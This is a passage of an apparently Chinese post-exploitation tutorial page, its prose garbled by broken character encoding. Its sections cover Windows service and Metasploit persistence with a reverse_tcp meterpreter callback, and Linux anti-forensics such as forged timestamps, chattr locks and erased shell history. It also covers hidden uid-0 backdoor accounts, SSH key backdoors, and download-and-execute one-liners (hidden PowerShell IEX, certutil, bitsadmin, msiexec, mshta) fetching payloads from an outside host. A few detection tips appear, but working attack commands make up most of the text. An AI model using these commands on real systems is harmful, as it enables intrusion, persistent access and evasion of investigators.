è‡ªå¯åŠ¨æœåŠ¡ä¸€èˆ¬æ˜¯åœ¨ç”µè„‘å¯åŠ¨ååœ¨åå°åŠ è½½æŒ‡å®šçš„æœåŠ¡ç¨‹åºï¼Œæˆ‘ä»¬å¯ä»¥å°†exeæ–‡ä»¶æ³¨å†Œä¸ºæœåŠ¡ï¼Œä¹Ÿå¯ä»¥å°†dllæ–‡ä»¶æ³¨å†Œä¸ºæœåŠ¡ã€‚<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">sc create test <span style="color: #a0522d;">binpath</span>= C:\Users\Administrator\Desktop\7764.exe &#65288;&#27880;&#24847;&#31561;&#21495;&#21518;&#38754;&#26377;&#31354; &#26684;&#65289;#&#21019;&#24314;&#26381;&#21153;
sc config test <span style="color: #a0522d;">start</span>= auto <span style="color: #b22222;">#</span><span style="color: #b22222;">&#35774;&#32622;&#26381;&#21153;&#20026;&#33258;&#21160;&#21551;&#21160;&#65292;&#21363;&#20351;&#26381;&#21153;&#34987;&#20851;&#38381;&#20102;&#36824;&#20250;&#34987;&#21551;&#21160;&#36215;&#26469;</span>
net start test <span style="color: #b22222;">#</span><span style="color: #b22222;">&#21551;&#21160;&#26381;&#21153;</span>
</pre>
</div>


<figure id="org65a6d33">
<img src="./images/img_20230816_170239.png" alt="img_20230816_170239.png" width="60%"><br>

</figure>
</div>
</div>
</div>
<div id="outline-container-orgaa64fd8" class="outline-3">
<h3 id="orgaa64fd8">Linuxæƒé™ç»´æŒ-éšè—ç¯‡</h3>
<div class="outline-text-3" id="text-orgaa64fd8">
<p>
<b>ä½¿ç”¨ç¯å¢ƒï¼šCentOS</b><br>
</p>

<p>
æ”»å‡»è€…åœ¨è·å–LinuxæœåŠ¡å™¨æƒé™åï¼Œä¼šé€šè¿‡ä¸€äº›æŠ€å·§æ¥éšè—è‡ªå·±çš„è¸ªè¿¹å’Œåé—¨æ–‡ä»¶ã€‚<br>
</p>
</div>
<div id="outline-container-orgef2794f" class="outline-4">
<h4 id="orgef2794f">éšè—æ–‡ä»¶</h4>
<div class="outline-text-4" id="text-orgef2794f">
<p>
Linux ä¸‹åˆ›å»ºä¸€ä¸ªéšè—æ–‡ä»¶ï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">touch .1.txt
</pre>
</div>

<p>
touch å‘½ä»¤å¯ä»¥åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œæ–‡ä»¶åå‰é¢åŠ ä¸€ä¸ªç‚¹å°±ä»£è¡¨æ˜¯éšè—æ–‡ä»¶ï¼Œå¦‚ä¸‹å›¾ï¼š<br>
</p>


<figure id="orgd0efb16">
<img src="./images/img_20230816_170608.png" alt="img_20230816_170608.png" width="60%"><br>

</figure>

<p>
ä¸€èˆ¬çš„Linuxä¸‹çš„éšè—ç›®å½•ä½¿ç”¨å‘½ä»¤ ls -l æ˜¯æŸ¥çœ‹ä¸å‡ºæ¥çš„ï¼Œåªèƒ½æŸ¥çœ‹åˆ°æ–‡ä»¶åŠæ–‡ä»¶å¤¹ï¼ŒæŸ¥çœ‹Linuxä¸‹çš„éšè—æ–‡ä»¶éœ€è¦ç”¨åˆ°å‘½ä»¤ï¼š ls -la<br>
</p>

<p>
è¿™é‡Œï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨/tmpä¸‹ï¼Œé»˜è®¤å­˜åœ¨å¤šä¸ªéšè—ç›®å½•ï¼Œè¿™äº›ç›®å½•æ˜¯æ¶æ„æ–‡ä»¶å¸¸ç”¨æ¥è—èº«çš„åœ°æ–¹ã€‚<br>
å¦‚ <i>temp</i>.ICE-unix/ã€/temp/.Test-unix/ã€/temp/.X11-unix/ã€/temp/.XIM-unix/<br>
</p>


<figure id="org01d684b">
<img src="./images/img_20230816_170646.png" alt="img_20230816_170646.png" width="60%"><br>

</figure>
</div>
</div>
<div id="outline-container-org76af6c0" class="outline-4">
<h4 id="org76af6c0">éšè—æ–‡ä»¶æ—¶é—´æˆ³</h4>
<div class="outline-text-4" id="text-org76af6c0">
<p>
Linuxä¸‹éšè—åé—¨å¿…é¡»è¦ä¿®æ”¹æ—¶é—´ï¼Œå¦åˆ™å¾ˆå®¹æ˜“è¢«å‘ç°ï¼Œç›´æ¥åˆ©ç”¨ touch å°±å¯ä»¥äº†ã€‚<br>
</p>

<p>
å°†æ—¶é—´æˆ³ä¿®æ”¹æˆæŸå¹´æŸæœˆæŸæ—¥ã€‚å¦‚ä¸‹ä¿®æ”¹one.phpæ—¶é—´æˆ³ä¸ºï¼š2019å¹´08æœˆ08æ—¥ã€‚<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">touch -t 1908081042.30 one.php
</pre>
</div>
</div>
</div>
<div id="outline-container-org965cf3d" class="outline-4">
<h4 id="org965cf3d">éšè—æƒé™</h4>
<div class="outline-text-4" id="text-org965cf3d">
<p>
åœ¨Linuxä¸­ï¼Œä½¿ç”¨chattrå‘½ä»¤ä¸ºæ–‡ä»¶æ·»åŠ é”å®šå±æ€§ï¼Œæ¥é˜²æ­¢rootå’Œå…¶ä»–ç®¡ç†ç”¨æˆ·è¯¯åˆ é™¤å’Œä¿®æ”¹é‡è¦æ–‡ä»¶åŠç›®å½•ï¼Œæ­¤æƒé™ç”¨ls -læ˜¯æŸ¥çœ‹ä¸å‡ºæ¥çš„ï¼Œä»è€Œè¾¾åˆ°éšè—æƒé™çš„ç›®çš„ã€‚<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">chattr +i evil.php &#20026;&#25991;&#20214;&#28155;&#21152;&#38145;&#23450;&#23646;&#24615;
lsattr evil.php &#23646;&#24615;&#26597;&#30475;
chattr -i evil.php &#35299;&#38500;&#38145;&#23450;
rm -rf evil.php &#21024;&#38500;&#25991;&#20214;
</pre>
</div>
</div>
</div>
<div id="outline-container-org748f726" class="outline-4">
<h4 id="org748f726">éšè—å†å²æ“ä½œå‘½ä»¤</h4>
<div class="outline-text-4" id="text-org748f726">
<p>
å¦‚æœåœ¨shellä¸­æ‰§è¡Œçš„å‘½ä»¤ï¼Œä¸å¸Œæœ›è¢«è®°å½•åœ¨å†å²å‘½ä»¤ä¸­ï¼Œå¦‚ä½•åœ¨Linuxä¸­å¼€å¯æ— ç—•æ“ä½œæ¨¡å¼å‘¢ï¼Ÿ<br>
</p>

<p>
æŠ€å·§ä¸€ï¼šåªé’ˆå¯¹ä½ çš„æ“ä½œå…³é—­å†å²è®°å½•<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">[space]set +o history
</pre>
</div>

<p>
ä¸Šé¢çš„å‘½ä»¤ä¼šä¸´æ—¶ç¦ç”¨å†å²åŠŸèƒ½ï¼Œè¿™æ„å‘³ç€åœ¨è¿™å‘½ä»¤ä¹‹åä½ æ‰§è¡Œçš„æ‰€æœ‰æ“ä½œéƒ½ä¸ä¼šè®°å½•åˆ°å†å²å‘½ä»¤ä¸­ï¼Œç„¶è€Œè¿™ä¸ªå‘½ä»¤ä¹‹å‰çš„æ‰€æœ‰ä¸œè¥¿éƒ½ä¼šåŸæ ·è®°å½•åœ¨å†å²å‘½ä»¤ä¸­ã€‚<br>
</p>

<p>
è¦é‡æ–°å¼€å¯å†å²åŠŸèƒ½ï¼Œæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">[Space]set -o history &#23427;&#23558;&#29615;&#22659;&#24674;&#22797;&#21407;&#29366;&#65292;&#20063;&#23601;&#26159;&#20320;&#23436;&#25104;&#20102;&#20320;&#30340;&#24037;&#20316;&#65292;&#25191;&#34892;&#19978;&#36848;&#21629;&#20196;&#20043;&#21518;&#30340;&#21629;&#20196;&#37117;&#20250;&#20986;&#29616;&#22312;&#21382;&#21490;&#20013;&#12290; 
</pre>
</div>

<p>
æŠ€å·§äºŒï¼šä»å†å²è®°å½•ä¸­åˆ é™¤æŒ‡å®šçš„å‘½ä»¤<br>
å‡è®¾å†å²å‘½ä»¤ä¸­å·²ç»åŒ…å«äº†ä¸€äº›ä½ ä¸å¸Œæœ›è®°å½•çš„å‘½ä»¤ï¼Œè¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬æ€ä¹ˆåŠï¼Ÿå¾ˆç®€å•ï¼Œé€šè¿‡ä¸‹é¢çš„å‘½ä»¤æ¥åˆ é™¤ï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #483d8b;">history</span> | grep <span style="color: #8b2252;">"keyword"</span>
</pre>
</div>

<p>
è¾“å‡ºå†å²è®°å½•ä¸­åŒ¹é…çš„å‘½ä»¤ï¼Œæ¯ä¸€æ¡å‘½ä»¤å‰é¢ä¼šæœ‰ä¸ªæ•°å­—ã€‚ä»å†å²è®°å½•ä¸­åˆ é™¤æŒ‡å®šçš„é¡¹ï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #483d8b;">history</span> -d [num]
</pre>
</div>

<p>
è¿™ç§æŠ€å·§æ˜¯å…³é”®è®°å½•åˆ é™¤ï¼Œå…¶ä»–æƒ…å†µæ¯”å¦‚å‰150è¡Œæ˜¯ç”¨æˆ·çš„æ­£å¸¸æ“ä½œè®°å½•ï¼Œ150ä»¥åæ˜¯æ”»å‡»è€…æ“ä½œè®°å½•ã€‚<br>
æˆ‘ä»¬å¯ä»¥åªä¿ç•™æ­£å¸¸çš„æ“ä½œï¼Œåˆ é™¤æ”»å‡»ç—•è¿¹çš„å†å²æ“ä½œè®°å½•ï¼Œè¿™é‡Œï¼Œæˆ‘ä»¬åªä¿ç•™å‰150è¡Œï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">sed -i <span style="color: #8b2252;">'150,$d'</span> .bash_history
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-org0d6910a" class="outline-3">
<h3 id="org0d6910a">Linuxæƒé™ç»´æŒ-åé—¨ç¯‡</h3>
<div class="outline-text-3" id="text-org0d6910a">
<p>
<b>ä½¿ç”¨ç¯å¢ƒï¼šKali Linux</b><br>
</p>
</div>
<div id="outline-container-orgbc57ccb" class="outline-4">
<h4 id="orgbc57ccb">ä¸€å¥è¯æ·»åŠ ç”¨æˆ·å’Œå¯†ç </h4>
<div class="outline-text-4" id="text-orgbc57ccb">
<p>
æ·»åŠ æ™®é€šç”¨æˆ·ï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#21019;&#24314;&#19968;&#20010;&#29992;&#25143;&#21517;guest&#65292;&#23494;&#30721;123456&#30340;&#26222;&#36890;&#29992;&#25143;</span>
useradd -p <span style="color: #ff00ff;">`openssl passwd -1 -salt 'salt' 123456`</span> guest

<span style="color: #b22222;"># </span><span style="color: #b22222;">useradd -p &#26041;&#27861; ` ` &#26159;&#29992;&#26469;&#23384;&#25918;&#21487;&#25191;&#34892;&#30340;&#31995;&#32479;&#21629;&#20196;,"$()"&#20063;&#21487;&#20197;&#23384;&#25918;&#21629;&#20196;&#25191;&#34892;&#35821;&#21477;</span>
useradd -p <span style="color: #8b2252;">"$(</span><span style="color: #ff00ff;">openssl passwd -1 123456</span><span style="color: #8b2252;">)"</span> guest

<span style="color: #b22222;"># </span><span style="color: #b22222;">chpasswd&#26041;&#27861;</span>
useradd guest;<span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">'guest:123456'</span>|chpasswd

<span style="color: #b22222;"># </span><span style="color: #b22222;">echo -e&#26041;&#27861;</span>
useradd test;<span style="color: #483d8b;">echo</span> -e <span style="color: #8b2252;">"123456\n123456\n"</span> |passwd test
</pre>
</div>

<p>
æ·»åŠ rootç”¨æˆ·ï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#21019;&#24314;&#19968;&#20010;&#29992;&#25143;&#21517;guest&#65292;&#23494;&#30721;123456&#30340;root&#29992;&#25143;</span>
useradd -p <span style="color: #ff00ff;">`openssl passwd -1 -salt 'salt' 123456`</span> guest1 -o -u 0 -g root -G root -s /bin/bash -d /home/test

]# su guest
]# whoami
root
</pre>
</div>

<p>
å¯ç–‘ç”¨æˆ·æ’æŸ¥æŠ€å·§ï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#26597;&#35810;&#29305;&#26435;&#29992;&#25143;&#29305;&#26435;&#29992;&#25143;(uid &#20026;0)</span>
[root@localhost ~]# awk -F: <span style="color: #8b2252;">'$3==0{print $1}'</span> /etc/passwd

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#26597;&#35810;&#21487;&#20197;&#36828;&#31243;&#30331;&#24405;&#30340;&#36134;&#21495;&#20449;&#24687;</span>
[root@localhost ~]# awk <span style="color: #8b2252;">'/\$1|\$6/{print $1}'</span> /etc/shadow

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#38500;root&#36134;&#21495;&#22806;&#65292;&#20854;&#20182;&#36134;&#21495;&#26159;&#21542;&#23384;&#22312;sudo&#26435;&#38480;&#12290;&#22914;&#38750;&#31649;&#29702;&#38656;&#35201;&#65292;&#26222;&#36890;&#36134;&#21495;&#24212;&#21024;&#38500;sudo&#26435;&#38480;</span>
[root@localhost ~]# more /etc/sudoers | grep -v <span style="color: #8b2252;">"^#\|^$"</span> | grep <span style="color: #8b2252;">"ALL=(ALL)"</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-org443e90e" class="outline-4">
<h4 id="org443e90e">SSHå…å¯†ç™»å½•</h4>
<div class="outline-text-4" id="text-org443e90e">
<p>
åœ¨å®¢æˆ·ç«¯ä¸Šç”Ÿæˆä¸€å¯¹å…¬ç§é’¥ï¼Œç„¶åæŠŠå…¬é’¥å®‰è£…åˆ°æœåŠ¡å™¨ä¸Šï¼ˆ~/.ssh/authorized_keysï¼‰ï¼Œä¿ç•™ç§é’¥ã€‚å½“sshç™»å½•æ—¶ï¼Œsshç¨‹åºä¼šå‘é€ç§é’¥å»å’ŒæœåŠ¡å™¨ä¸Šçš„å…¬é’¥åšåŒ¹é…ï¼Œå¦‚æœåŒ¹é…æˆåŠŸå°±å¯ä»¥ç™»å½•äº†ã€‚<br>
</p>

<p>
åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œå‘½ä»¤ï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">ssh-keygen -t rsa
</pre>
</div>

<p>
è¿‡ç¨‹ä¸­æŒ‰ä¸‰æ¬¡å›è½¦ã€‚<br>
</p>

<p>
è¿›å…¥/root/.ssh/æ–‡ä»¶å¤¹æŸ¥çœ‹å†…å®¹ï¼Œå…¶ä¸­ id_rsa ä¸ºç§é’¥ï¼Œ id_rsa.pub ä¸ºå…¬é’¥ã€‚<br>
</p>

<p>
æ¥ä¸‹æ¥éœ€è¦åœ¨æœåŠ¡å™¨ä¸Šå®‰è£…å…¬é’¥ï¼Œå³å°† id_rsa.pub çš„å†…å®¹è¿½åŠ åˆ° <i>root</i>.ssh/authorized_keys å†…ï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">cat id_rsa.pub &gt;&gt; authorized_keys
</pre>
</div>

<p>
vim /etc/ssh/sshd_configï¼Œå¼€å¯å¯†é’¥ç™»å½•çš„è®¤è¯æ–¹å¼ï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">PermitRootLogin yes
PubkeyAuthentication yes

/etc/init.d/ssh start
</pre>
</div>

<p>
å°†ç§é’¥æå–å‡ºæ¥ä¿å­˜åˆ°æœ¬åœ°ï¼Œå¯ä»¥åˆ©ç”¨æ­¤å¯†é’¥ç›´æ¥è¿›è¡Œç™»å½•ï¼š<br>
</p>


<figure id="org0c3ddd2">
<img src="./images/img_20230817_133227.png" alt="img_20230817_133227.png" width="60%"><br>

</figure>



<figure id="org9511464">
<img src="./images/img_20230817_133313.png" alt="img_20230817_133313.png" width="60%"><br>

</figure>



<figure id="orgfad969d">
<img src="./images/img_20230817_133328.png" alt="img_20230817_133328.png" width="60%"><br>

</figure>

<p>
æ’æŸ¥æŠ€å·§ï¼šæŸ¥çœ‹ <i>root</i>.ssh/authorized_keys æ˜¯å¦è¢«ä¿®æ”¹ï¼Œç»“åˆæ–‡ä»¶æ—¶é—´æˆ³ã€å†å²å‘½ä»¤ç­‰è¿›è¡Œæ’æŸ¥ã€‚<br>
</p>
</div>
</div>
</div>
<div id="outline-container-org38230ba" class="outline-3">
<h3 id="org38230ba">Windowså‘½ä»¤è¡Œæ–‡ä»¶ä¸‹è½½æ–¹å¼æ±‡æ€»</h3>
<div class="outline-text-3" id="text-org38230ba">
<p>
<b>ä½¿ç”¨ç¯å¢ƒï¼šWindows Server 2008</b><br>
</p>

<p>
å½“æˆ‘ä»¬é€šè¿‡Webæ¸—é€è·å–äº†ä¸€ä¸ªRCEæ¼æ´ï¼Œè€Œä¸”ç›®æ ‡ä¸»æœºæ˜¯Windowsï¼Œæˆ‘ä»¬è¯¥æ€ä¹ˆå»ä¸‹è½½åé—¨æ–‡ä»¶åˆ°ç›®æ ‡ä¸»æœºä¸Šæ‰§è¡Œå‘¢ï¼Ÿä¸€èˆ¬æ¥è¯´ï¼Œå®ç°Windowsæ–‡ä»¶ä¸‹è½½æ‰§è¡Œçš„æ–¹å¼ä¸»è¦å¦‚ä¸‹ï¼š<br>
</p>

<ul class="org-ul">
<li>ç¬¬ä¸€ç§ï¼Œè¿œç¨‹ä¸‹è½½æ–‡ä»¶åˆ°æœ¬åœ°ï¼Œç„¶åå†æ‰§è¡Œï¼›<br></li>
<li>ç¬¬äºŒç§ï¼Œè¿œç¨‹ä¸‹è½½æ‰§è¡Œï¼Œæ‰§è¡Œè¿‡ç¨‹æ²¡æœ‰äºŒè¿›åˆ¶æ–‡ä»¶è½åœ°ï¼Œè¿™ç§æ–¹å¼å·²ç„¶æˆä¸ºåé—¨æ–‡ä»¶ä¸‹è½½æ‰§è¡Œçš„é¦–è¦æ–¹å¼ã€‚<br></li>
</ul>

<p>
ä¸‹é¢æ˜¯å¸¸è§çš„æ–‡ä»¶ä¸‹è½½æ‰§è¡Œçš„æ–¹å¼ï¼š<br>
</p>
</div>
<div id="outline-container-org8c5fa78" class="outline-4">
<h4 id="org8c5fa78">PowerShell</h4>
<div class="outline-text-4" id="text-org8c5fa78">
<p>
PowerShellæ˜¯ä¸€ç§å‘½ä»¤è¡Œå¤–å£³ç¨‹åºå’Œè„šæœ¬ç¯å¢ƒï¼Œä½¿å¾—å‘½ä»¤è¡Œç”¨æˆ·å’Œè„šæœ¬ç¼–å†™è€…å¯ä»¥åˆ©ç”¨ã€‚<br>
</p>

<p>
è¿œç¨‹ä¸‹è½½æ–‡ä»¶ä¿å­˜åœ¨æœ¬åœ°ï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #0000ff;">powershell</span> (new-object System.Net.WebClient).DownloadFile(<span style="color: #8b2252;">'http://192.168.85.1/one.exe'</span>,<span style="color: #8b2252;">'one.exe'</span>)
</pre>
</div>

<p>
è¿œç¨‹æ‰§è¡Œå‘½ä»¤ï¼šä»¥éšè—çš„æ–¹å¼ä¸‹è½½å¹¶æ‰§è¡Œåé—¨<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">powershell -nop -w hidden -c <span style="color: #8b2252;">"IEX ((new-object net.webclient).downloadstring('http://192.168.85.1/one.exe'))"</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-org378f754" class="outline-4">
<h4 id="org378f754">Bitsadmin</h4>
<div class="outline-text-4" id="text-org378f754">
<p>
bitsadminæ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œå¯ç”¨äºåˆ›å»ºä¸‹è½½æˆ–ä¸Šä¼ å·¥ä½œå’Œç›‘æµ‹å…¶è¿›å±•æƒ…å†µã€‚<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">bitsadmin /transfer n http://192.168.85.1/one.exe .<span style="color: #8b2252;">\</span>
</pre>
</div>


<figure id="org8ed5f33">
<img src="./images/img_20230817_133742.png" alt="img_20230817_133742.png" width="60%"><br>

</figure>
</div>
</div>
<div id="outline-container-org937d940" class="outline-4">
<h4 id="org937d940">certutil</h4>
<div class="outline-text-4" id="text-org937d940">
<p>
ç”¨äºå¤‡ä»½è¯ä¹¦æœåŠ¡ï¼Œæ”¯æŒxp-win10éƒ½æ”¯æŒã€‚ç”±äºcertutilä¸‹è½½æ–‡ä»¶éƒ½ä¼šç•™ä¸‹ç¼“å­˜ï¼Œæ‰€ä»¥ä¸€èˆ¬éƒ½å»ºè®®ä¸‹è½½å®Œæ–‡ä»¶åå¯¹ç¼“å­˜è¿›è¡Œåˆ é™¤ã€‚<br>
</p>

<p>
æ³¨ï¼šç¼“å­˜ç›®å½•ä¸ºï¼š"%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content"<br>
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#19979;&#36733;&#25991;&#20214;</span>
certutil -urlcache -split -f http://192.168.85.1/one.exe one.exe
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#21024;&#38500;&#32531;&#23384;</span>
certutil -urlcache -split -f http://192.168.85.1/one.exe one.exe delete
</pre>
</div>


<figure id="org7fd4eda">
<img src="./images/img_20230817_133936.png" alt="img_20230817_133936.png" width="60%"><br>

</figure>



<figure id="orge34b556">
<img src="./images/img_20230817_134003.png" alt="img_20230817_134003.png" width="60%"><br>

</figure>
</div>
</div>
<div id="outline-container-org5130b2b" class="outline-4">
<h4 id="org5130b2b">msiexec</h4>
<div class="outline-text-4" id="text-org5130b2b">
<p>
msiexec æ”¯æŒè¿œç¨‹ä¸‹è½½åŠŸèƒ½ï¼Œå°†msiæ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œé€šè¿‡å¦‚ä¸‹å‘½ä»¤è¿œç¨‹æ‰§è¡Œï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#29983;&#25104;msi&#21253;&#20316;&#29992;&#26159;&#25191;&#34892;calc.exe</span>
msfvenom -p windows/exec <span style="color: #a0522d;">CMD</span>=<span style="color: #8b2252;">'calc.exe'</span> -f msi &gt; calc.msi
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#36828;&#31243;&#25191;&#34892;</span>
msiexec /q /i http://192.168.85.1/calc.msi
</pre>
</div>

<p>
ç”ŸæˆmsiåŒ…<br>
</p>


<figure id="orgd339818">
<img src="./images/img_20230817_134122.png" alt="img_20230817_134122.png" width="60%"><br>

</figure>

<p>
è¿œç¨‹æ‰§è¡Œ<br>
</p>


<figure id="org6ab4144">
<img src="./images/img_20230817_134134.png" alt="img_20230817_134134.png" width="60%"><br>

</figure>
</div>
</div>
<div id="outline-container-org621c101" class="outline-4">
<h4 id="org621c101">mshta</h4>
<div class="outline-text-4" id="text-org621c101">
<p>
mshtaç”¨äºæ‰§è¡Œ.htaæ–‡ä»¶ï¼Œè€Œhtaæ˜¯HTML Applocation çš„ç¼©å†™ï¼Œä¹Ÿå°±æ˜¯HTMLåº”ç”¨ç¨‹åºã€‚è€Œhtaä¸­ä¹Ÿæ”¯æŒVBSã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨htaæ¥ä¸‹è½½æ–‡ä»¶ã€‚<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">mshta http://192.168.85.1/run.hta
</pre>
</div>


<figure id="orgf47564a">
<img src="./images/img_20230817_134207.png" alt="img_20230817_134207.png" width="60%"><br>

</figure>

<p>
run.htaå†…å®¹ä¸ºï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-html">&lt;<span style="color: #0000ff;">HTML</span>&gt;
&lt;<span style="color: #0000ff;">meta</span> <span style="color: #a0522d;">http-equiv</span>=<span style="color: #8b2252;">"Content-Type"</span> <span style="color: #a0522d;">content</span>=<span style="color: #8b2252;">"text/html; charset=utf-8"</span>&gt;
&lt;<span style="color: #0000ff;">HEAD</span>&gt;
  &lt;<span style="color: #0000ff;">script</span> <span style="color: #a0522d;">language</span>=<span style="color: #8b2252;">"VBScript"</span>&gt;
    Window.ReSizeTo 0, 0
    Window.moveTo -2000,-2000
    Set objShell = CreateObject("Wscript.Shell")
    objShell.Run "calc.exe" // &#36825;&#37324;&#22635;&#20889;&#21629;&#20196;
    self.close
  &lt;/<span style="color: #0000ff;">script</span>&gt;
  &lt;<span style="color: #0000ff;">body</span>&gt;
    demo
&lt;/<span style="color: #0000ff;">body</span>&gt;
&lt;/<span style="color: #0000ff;">HEAD</span>&gt;
&lt;/<span style="color: #0000ff;">HTML</span>&gt;
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-org7bd683a" class="outline-3">
<h3 id="org7bd683a">æ¸—é€æµ‹è¯•æ¡†æ¶æƒé™ç»´æŒæŠ€æœ¯</h3>
<div class="outline-text-3" id="text-org7bd683a">
<p>
MSFç»´æŒæƒé™çš„ä½¿ç”¨å‰ææ˜¯å…ˆè·å¾—ä¸€ä¸ªmeterpreter shellï¼Œé€šè¿‡meterpreter shellè·å–æŒä¹…æ€§shellçš„æ–¹æ³•å¦‚ä¸‹ï¼š<br>
</p>
</div>
<div id="outline-container-org1acd20d" class="outline-4">
<h4 id="org1acd20d">Persistenceæ¨¡å—</h4>
<div class="outline-text-4" id="text-org1acd20d">
<p>
é€šè¿‡å¯åŠ¨é¡¹å¯åŠ¨ï¼ˆpersistenceï¼‰çš„æ–¹å¼ï¼Œåœ¨ç›®æ ‡æœºå™¨ä¸Šä»¥åå¼¹å›è¿ã€‚<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">-U&#65306;&#35774;&#32622;&#21518;&#38376;&#22312;&#29992;&#25143;&#30331;&#24405;&#21518;&#33258;&#21551;&#21160;&#12290;&#35813;&#26041;&#24335;&#20250;&#22312; HKCU\Software\Microsoft\Windows\CurrentVersion\Run &#19979;&#28155;&#21152;&#27880;&#20876;&#34920;&#20449;&#24687;&#12290;
-X&#65306;&#35774;&#32622;&#21518;&#38376;&#22312;&#31995;&#32479;&#21551;&#21160;&#21518;&#33258;&#21551;&#21160;&#12290;&#35813;&#26041;&#24335;&#20250;&#22312; HKLM\Software\Microsoft\Windows\CurrentVersion\Run &#19979;&#28155;&#21152;&#27880;&#20876;&#34920;&#20449;&#24687;&#12290;&#36825;&#37324;&#21487;&#33021;&#20250;&#30001;&#20110;&#29615;&#22659; &#38382;&#39064;&#65292;&#23548;&#33268;&#28155;&#21152;&#22833;&#36133;&#65292;&#21518;&#38376;&#23558;&#26080;&#27861;&#21551;&#21160;&#12290;
-S&#65306;&#20316;&#20026;&#26381;&#21153;&#33258;&#21160;&#21551;&#21160;&#20195;&#29702;&#31243;&#24207;&#65288;&#20855;&#26377;SYSTEM&#26435;&#38480;&#65289;
</pre>
</div>

<div class="org-src-container">
<pre class="src src-sh">run persistence -X -i 5 -p 9999 -r IP -P windows/x64/meterpreter/reverse_tcp
</pre>
</div>

<p>
-i è®¾ç½®å›è¿çš„æ—¶é—´é—´éš”<br>
-p è®¾ç½®ç›‘æ§çš„ç«¯å£ï¼Œwindowsæ²¡æœ‰è¢«å ç”¨çš„ç«¯å£<br>
-r kali æœåŠ¡å™¨çš„åœ°å€<br>
</p>


<figure id="orgf19cd58">
<img src="./images/img_20230817_134541.png" alt="img_20230817_134541.png" width="60%"><br>

</figure>

<p>
ç”Ÿæˆçš„ç›¸å…³æ–‡ä»¶ä½ç½® ï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#21518;&#38376;&#25991;&#20214;&#20301;&#32622;&#65306;</span>
C:\Windows\Temp C:\Users\Administrator\AppData\Local\Temp
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#27880;&#20876;&#34920;&#20301;&#32622;&#65306;</span>
HKCU\Software\Microsoft\Windows\CurrentVersion\Run<span style="color: #8b2252;">\</span>
HKLM\Software\Microsoft\Windows\CurrentVersion\Run<span style="color: #8b2252;">\</span>
</pre>
</div>


<figure id="org122f7e9">
<img src="./images/img_20230817_134643.png" alt="img_20230817_134643.png" width="60%"><br>

</figure>


<figure id="orge99a2ee">
<img src="./images/img_20230817_140515.png" alt="img_20230817_140515.png" width="60%"><br>

</figure>

<p>
åœ¨Kaliä¸­ä¿®æ”¹ç›‘å¬ç«¯å£ä¸º9999ï¼Œé‡æ–°å¯åŠ¨ç›®æ ‡æœºå™¨ï¼Œå³å¯å†æ¬¡æ”¶åˆ°ä¼šè¯ã€‚<br>
</p>


<figure id="orgbff5487">
<img src="./images/img_20230817_134704.png" alt="img_20230817_134704.png" width="60%"><br>

</figure>
</div>
</div>
</div>
<div id="outline-container-orgc675b61" class="outline-3">
<h3 id="orgc675b61">å¸¸è§Webshellç®¡ç†å·¥å…·</h3>
<div class="outline-text-3" id="text-orgc675b61">
</div>
<div id="outline-container-orgbc61aa0" class="outline-4">
<h4 id="orgbc61aa0">èœåˆ€</h4>
<div class="outline-text-4" id="text-orgbc61aa0">
<p>
